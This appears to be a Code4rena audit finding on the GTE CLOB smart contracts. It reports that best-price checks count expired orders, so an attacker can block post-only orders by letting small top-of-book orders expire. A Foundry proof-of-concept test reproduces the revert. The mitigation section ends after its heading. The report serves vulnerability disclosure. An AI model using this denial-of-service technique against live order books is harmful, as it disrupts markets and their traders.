  "body": "## Finding Description   \nA discrepancy in order expiration handling between price checking and order matching allows expired orders to block new post-only orders, potentially disrupting market operations.\n\n \nThe CLOB implements an order book with price-time priority matching. The system maintains bid and ask orders in separate Red-Black trees, with `getBestBidPrice()` and `getBestAskPrice()` used to find the most competitive prices. For post-only orders, these functions check if the order would immediately fill against existing orders.\n\nThe issue arises because:\n1. Price checking functions ([`getBestBidPrice()`](https://github.com/code-423n4/2025-07-gte-clob/blob/2783108d14010ae50f2a5f65c3a9c94e2e7845b9/contracts/clob/types/Book.sol#L427-L429)/[`getBestAskPrice()`](https://github.com/code-423n4/2025-07-gte-clob/blob/2783108d14010ae50f2a5f65c3a9c94e2e7845b9/contracts/clob/types/Book.sol#L432-L434) ) return the best price without verifying if the corresponding order is expired\n2. However, the matching engine (`_matchIncomingBid()`/`_matchIncomingAsk()`) correctly skips expired orders during actual matching\n3. This creates a scenario where a post-only order is rejected due to an expired order that wouldn't actually match against it\n4. [`_executeBidLimitOrder()`](https://github.com/code-423n4/2025-07-gte-clob/blob/2783108d14010ae50f2a5f65c3a9c94e2e7845b9/contracts/clob/CLOB.sol#L574-L604) checks `limitOrderType == POST_ONLY` and compares `ds.getBestAskPrice()` (still *P*) to the incoming bid price. Because *P* ≤ bid price, the function reverts with `PostOnlyOrderWouldFill`.  \nThe highest impact occurs when:\n1. An attacker places a small, soon-to-expire order at the top of the book\n2. After expiration, the order remains in the price tree but is skipped during matching\n3. New post-only orders at the same or better price are rejected due to the expired order still being considered in the best price check\n\n\nIn [Book.sol](cci:7://file:///Users/0xniloy/Desktop/c4/2025-07-gte-clob/contracts/clob/types/Book.sol:0:0-0:0), the `minimum()` and `maximum()` functions in the RedBlackTree implementation return the best prices without checking order expiration, while the matching logic in [CLOB.sol](cci:7://file:///Users/0xniloy/Desktop/c4/2025-07-gte-clob/contracts/clob/CLOB.sol:0:0-0:0) does check for expiration.\n```solidity\nfunction minimum(RedBlackTree storage tree) internal view returns (uint256) {\n   bytes32 result = RedBlackTreeLib.first(tree.tree); if (result == bytes32(0)) return type(uint256).max; \n   return RedBlackTreeLib.value(result);\n   // No expiration check\n }\n\n```\n\n\n\nThis vulnerability allows an attacker to perform a low-cost denial-of-service attack on post-only orders by placing and letting small orders expire at the top of the book, disrupting normal market operations and potentially manipulating market behavior.\n\n\n## Impact Explanation  \nHigh. The vulnerability can be exploited to disrupt normal market operations with minimal cost, potentially enabling market manipulation and preventing legitimate trading strategies from functioning as intended.\n\n## Recommended Mitigation Steps\nModify the price checking functions to skip expired orders when determining the best price:",
  "proof_of_concept": "## Proof of Concept\n`test/c4-poc/PoC.t.sol`\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {PoCTestBase} from \"./PoCTestBase.t.sol\";\nimport {Side} from \"contracts/clob/types/Order.sol\";\nimport {ICLOB} from \"contracts/clob/ICLOB.sol\";\nimport {CLOB} from \"contracts/clob/CLOB.sol\";\n\ncontract PoC is PoCTestBase {\n    /// @notice Demonstrates that an expired top-of-book order still causes\n    ///         post-only limit orders to revert with `PostOnlyOrderWouldFill`.\n    ///         Steps:\n    ///         1. Maker places an ask that expires tomorrow.\n    ///         2. Warp time beyond the expiry so the ask is now expired but\n    ///            still at the head of the ask book.\n    ///         3. Taker places a post-only bid at the same price.  Because\n    ///            `getBestAskPrice()` does not ignore the expired ask, the\n    ///            pre-check reverts even though matching would have skipped it.\n    function test_ExpiredTOB_RevertsPostOnly() public {\n        uint256 price = 100 ether;\n        uint256 amountInBase = 1 ether;\n\n        // ------------------------------------------------------------\n        // 1. Place a SELL (ask) order that will expire tomorrow\n        // ------------------------------------------------------------\n        address maker = users[0];\n        // Deposit base tokens for the maker so they can sell\n        setupTokens(Side.SELL, maker, amountInBase, price, true);\n\n        ICLOB.PostLimitOrderArgs memory askArgs = ICLOB.PostLimitOrderArgs({\n            amountInBase: amountInBase,\n            clientOrderId: 0,\n            price: price,\n            cancelTimestamp: TOMORROW,\n            side: Side.SELL,\n            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED\n        });\n\n        vm.prank(maker);\n        clob.postLimitOrder(maker, askArgs);\n\n        // ------------------------------------------------------------\n        // 2. Warp forward so the ask is now expired but still in the book\n        // ------------------------------------------------------------\n        vm.warp(block.timestamp + 2 days);\n\n        // ------------------------------------------------------------\n        // 3. Attempt to place a POST_ONLY BUY (bid) order at the same price\n        //    Expect a revert due to the bug (expired TOB considered active)\n        // ------------------------------------------------------------\n        address taker = users[1];\n        // Deposit quote tokens for the taker so they can bid\n        uint256 quoteNeeded = quoteTokenAmount(price, amountInBase);\n        setupTokens(Side.BUY, taker, quoteNeeded, price, false);\n\n        ICLOB.PostLimitOrderArgs memory bidArgs = ICLOB.PostLimitOrderArgs({\n            amountInBase: amountInBase,\n            clientOrderId: 0,\n            price: price,\n            cancelTimestamp: TOMORROW + 10 days,\n            side: Side.BUY,\n            limitOrderType: ICLOB.LimitOrderType.POST_ONLY\n        });\n\n        vm.startPrank(taker);\n        vm.expectRevert(CLOB.PostOnlyOrderWouldFill.selector);\n        clob.postLimitOrder(taker, bidArgs);\n        vm.stopPrank();\n    }\n}\n```",
